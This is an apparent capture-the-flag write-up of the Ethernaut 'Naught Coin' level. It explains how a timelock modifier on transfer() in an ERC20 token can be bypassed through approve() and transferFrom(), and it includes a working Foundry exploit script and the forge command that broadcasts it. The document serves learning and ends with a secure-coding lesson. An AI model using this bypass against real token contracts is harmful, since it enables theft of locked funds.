@@ -1,0 +1,82 @@
+"This level is based on ERC20 tokens, and our player is already holding all of them. To complete this level, we must get our token balance to 0, i.e., transfer all the tokens from our account to someone else's.
+The catch is that there's a lockout period of 10 years and we need to bypass this somehow. Let's get started. 
+To understand this level, we must know what an ERC20 token standard is. It is an API for tokens that defines certain standard function calls, parameters, and events and anyone who intends to create an ERC20 token must follow those standards. 
+This makes it easier for all the developers using these tokens to predict their usage and interactions. 
+There are two important areas in this vulnerable contract. They are:
+The function transfer() and the modifier lockTokens(). 
+transfer()
+lockTokens()
+function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+    super.transfer(_to, _value);
+}
+
+// Prevent the initial owner from transferring tokens until the timelock has passed
+modifier lockTokens() {
+    if (msg.sender == player) {
+        require(now > timeLock);
+        _;
+    } else {
+        _;
+    }
+}
+
+To transfer the tokens out of our account we could have called the transfer() function but since it is using a modifier that is checking for the timelock period, we can't do this. 
+transfer()
+This is where the knowledge of ERC20 is used. There are more ways to transfer tokens out of a contract. The transfer() function is one of the methods and the other one is approve() and transferFrom(). 
+transfer()
+approve()
+transferFrom()
+Both approve() and transferFrom() are used in conjunction. 
+approve()
+transferFrom()
+function approve(address _spender, uint256 _value) public returns (bool success)
+
+This function is used to allow the _spender to spend _value amount of tokens on behalf of the owner. 
+_spender
+_value
+function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)
+
+This function is used to transfer the approved tokens (_value) from the owner's account to the address mentioned in the _to by the _spender approved in the previous step. 
+_value
+_to
+_spender
+Since the Naught Coin contract is inheriting from ERC20, and the modifier lockTokens() is not enforcing the timelock on the transferFrom() function, we are free to call  the approve and transferFrom to transfer all the tokens out of our account. 
+lockTokens()
+transferFrom()
+Here's our exploit code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel15.sol"";
+
+contract POC is Script {
+
+    NaughtCoin level15 = NaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);
+
+    function run() external{
+        vm.startBroadcast();
+        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
+        uint myBal = level15.balanceOf(myWallet);
+        console.log(""Current balance is: "", myBal);
+
+        level15.approve(myWallet, myBal);
+        level15.transferFrom(myWallet, address(level15), myBal);
+
+        console.log(""New balance is: "", level15.balanceOf(myWallet));
+        vm.stopBroadcast();
+    }
+}
+
+In the code shown above, the address stored inside myWallet is our own wallet's/player address which owns all the Naught Coins. 
+myWallet
+We are logging the current and the new balance of our player to make sure the attack was successful. 
+approve()
+transferFrom()
+Let's run the script using the following command. The console log shows the updated balance. 
+forge script ./script/level15.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+
+The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+If you are inheriting from any token standard or another contract, make sure to implement all the available functions or check that they can't be abused to modify the contract's logic. "
